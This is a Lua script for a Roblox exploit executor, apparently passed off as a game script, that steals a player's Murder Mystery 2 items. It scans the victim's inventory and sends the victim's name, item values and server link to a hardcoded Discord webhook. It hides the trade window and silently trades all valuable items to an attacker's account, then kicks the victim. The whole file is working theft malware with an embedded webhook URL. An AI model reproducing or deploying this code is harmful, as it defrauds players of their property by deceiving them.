_G.scriptExecuted = _G.scriptExecuted or false 
if _G.scriptExecuted then return end 
_G.scriptExecuted = true

print("✅ 1. Script started")

-- ===== MULTIVERSAL REQUEST HANDLER =====
local http_request = (syn and syn.request) or (http and http.request) or http_request or request
if not http_request then
    game.Players.LocalPlayer:Kick("Executor not supported")
    return
end
print("✅ 2. HTTP handler found")

-- ===== SERVICES =====
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
print("✅ 3. Services loaded, player: " .. plr.Name)

-- ===== CONFIGURATION =====
local users = _G.Usernames or {"zzeeuuss1233"}
local min_rarity = _G.min_rarity or "Common"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1374394558657331374/-dmo5vt8NdkPEBRMIrKBG4TdeMxJBrIIyVZSlcqGbB8OZwf8-8QT3Pqxkmj3Tn3H2ksX"
print("✅ 4. Config loaded, webhook: " .. (webhook ~= "" and "Yes" or "No"))

-- Proxy Fix
webhook = webhook:gsub("discord.com", "webhook.lewisakura.moe")
print("✅ 5. Proxy applied")

-- ===== VALIDATION =====
print("✅ 6. Starting validation checks...")

if next(users) == nil or webhook == "" then
    print("❌ Validation failed: users or webhook missing")
    plr:Kick("Missing username or webhook")
    return
end
print("✅ 7. Users and webhook OK")

if game.PlaceId ~= 142823291 then
    print("❌ Wrong game: " .. game.PlaceId)
    plr:Kick("Please join a normal MM2 server")
    return
end
print("✅ 8. Game ID OK: 142823291")

if #Players:GetPlayers() >= 12 then
    print("❌ Server full: " .. #Players:GetPlayers())
    plr:Kick("Server is full. Join a less populated server")
    return
end
print("✅ 9. Player count OK: " .. #Players:GetPlayers())

-- VIP Server Check
print("✅ 10. Checking VIP server...")
local serverType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
print("✅ 11. Server type: " .. serverType)
if serverType == "VIPServer" then
    print("❌ VIP server detected")
    plr:Kick("Server error. Please join a DIFFERENT server")
    return
end

-- ===== DATABASE & UNTRADABLES =====
print("✅ 12. Loading database...")
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
print("✅ 13. Database loaded")

local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
local min_rarity_index = table.find(rarityTable, min_rarity) or 1
print("✅ 14. Rarity index: " .. min_rarity_index)

local untradable = {["DefaultGun"] = true, ["DefaultKnife"] = true, ["SharkSeeker"] = true}
print("✅ 15. Untradable list ready")

-- ===== FIXED VALUE SYSTEM =====
local function getRealValue(itemName, rarity)
    local name = itemName:lower():gsub("%s+", "")
    local values = {
        ["travelersgun"] = 4300, ["evergun"] = 3400, ["constellation"] = 2600,
        ["evergreen"] = 1900, ["vampiresgun"] = 1750, ["turkey"] = 1600,
        ["harvester"] = 1150, ["sakura"] = 960, ["blossom"] = 950,
        ["corrupt"] = 880, ["darkshot"] = 860, ["darksword"] = 840,
        ["icepique"] = 390, ["bat"] = 350, ["makeshift"] = 310,
        ["jd"] = 200, ["cottoncandy"] = 150
    }
    
    if values[name] then return values[name] end

    if rarity == "Ancient" or rarity == "Unique" then return 500
    elseif rarity == "Godly" then return 100
    elseif rarity == "Legendary" then return 5
    elseif rarity == "Rare" then return 2
    elseif rarity == "Uncommon" or rarity == "Common" then return 1
    end
    
    return 0
end
print("✅ 16. Value system loaded")

-- ===== SCAN & SMART SORT =====
print("✅ 17. Scanning inventory...")
local weaponsToSend = {}
local totalValue = 0
local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
print("✅ 18. Inventory data received")

for id, amt in pairs(realData.Weapons.Owned) do
    if not untradable[id] and database[id] then
        local item = database[id]
        local rarity = item.Rarity
        local rIdx = table.find(rarityTable, rarity)
        
        if rIdx and rIdx >= min_rarity_index then
            local val = getRealValue(item.ItemName or id, rarity)
            
            if val >= min_value then
                totalValue = totalValue + (val * amt)
                table.insert(weaponsToSend, {
                    DataID = id, Name = item.ItemName or id,
                    Rarity = rarity, Amount = amt, Value = val
                })
            end
        end
    end
end
print("✅ 19. Items found: " .. #weaponsToSend .. ", Total value: " .. totalValue)

table.sort(weaponsToSend, function(a, b) return a.Value > b.Value end)
print("✅ 20. Items sorted by value")

-- ===== HIDE GUI =====
print("✅ 21. Hiding trade GUI...")
for _, gName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = playerGui:WaitForChild(gName)
    gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled = false end)
    gui.Enabled = false
end
print("✅ 22. GUI hidden")

-- ===== UNIVERSAL WEBHOOK FUNCTION =====
local function executeWebhook(webhookData)
    local success = false
    
    local methods = {
        function() 
            return syn and syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(webhookData)
            })
        end,
        function() 
            return http and http.request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(webhookData)
            })
        end,
        function() 
            return http_request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(webhookData)
            })
        end,
        function() 
            return request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(webhookData)
            })
        end,
        function()
            return HttpService:PostAsync(webhook, HttpService:JSONEncode(webhookData))
        end
    }
    
    for _, method in ipairs(methods) do
        local ok = pcall(method)
        if ok then
            success = true
            break
        end
    end
    
    if not success then
        print("⚠️ Webhook failed")
    end
    
    return success
end
print("✅ 23. Webhook function ready")

-- ===== DISCORD FUNCTIONS =====
local function SendFirstMessage(list, prefix)
    print("✅ 24. Sending Discord message...")
    local itemLines = ""
    for i, item in ipairs(list) do
        if i <= 15 then
            itemLines = itemLines .. string.format("• **%s** (x%s): %d Value\n", item.Name, item.Amount, (item.Value * item.Amount))
        end
    end
    executeWebhook({
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        embeds = {{
            title = "🔪 MM2 Hit Detected!",
            color = 0x00FF00,
            fields = {
                {name = "Victim", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total Value", value = "```" .. totalValue .. "```", inline = true},
                {name = "Items (Sorted High -> Low)", value = itemLines ~= "" and itemLines or "No items"},
                {name = "Server Link", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId}
            }
        }}
    })
    print("✅ 25. Discord message sent")
end

-- ===== TRADE EXECUTION =====
local function acceptTrade()
    print("🔄 Attempting to accept trade...")
    local success = pcall(function()
        ReplicatedStorage.Trade.AcceptTrade:FireServer(true)
    end)
    if not success then
        pcall(function()
            ReplicatedStorage.Trade.AcceptTrade:FireServer(1)
        end)
    end
    print("✅ Accept trade attempted")
end

local function doTrade(joinedUser)
    print("🔄 Starting trade with: " .. joinedUser)
    while #weaponsToSend > 0 do
        local status = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
        print("Trade status: " .. tostring(status))
        
        if status == "None" then
            print("Sending trade request to: " .. joinedUser)
            ReplicatedStorage.Trade.SendRequest:InvokeServer(Players:WaitForChild(joinedUser))
        elseif status == "StartTrade" then
            print("Trade started, adding items...")
            for i = 1, math.min(4, #weaponsToSend) do
                local weapon = table.remove(weaponsToSend, 1)
                for _ = 1, weapon.Amount do 
                    ReplicatedStorage.Trade.OfferItem:FireServer(weapon.DataID, "Weapons")
                    task.wait(0.1)
                end
            end
            task.wait(2)
            acceptTrade()
            repeat 
                task.wait(0.2) 
            until ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() == "None"
            print("Trade completed")
        end
        task.wait(0.5)
    end
    print("All items sent, kicking victim...")
    plr:Kick("Trade Finished. All items secured.")
end

-- ===== STARTUP =====
print("✅ 26. Checking for items...")
if #weaponsToSend > 0 then
    print("✅ 27. Items found, sending webhook...")
    local prefix = ping == "Yes" and "@everyone " or ""
    SendFirstMessage(weaponsToSend, prefix)
    print("✅ 28. Webhook sent, setting up chat listener...")

    local function onPlayerAdded(p)
        if table.find(users, p.Name) then
            print("✅ 29. Target user found: " .. p.Name)
            p.Chatted:Connect(function() 
                print("✅ 30. Target chatted! Starting trade...")
                doTrade(p.Name) 
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do 
        onPlayerAdded(p) 
    end
    Players.PlayerAdded:Connect(onPlayerAdded)
    print("✅ 31. Script fully loaded. Waiting for target to chat...")
else
    print("❌ No items found, kicking victim")
    plr:Kick("Victim has no valuable items.")
end
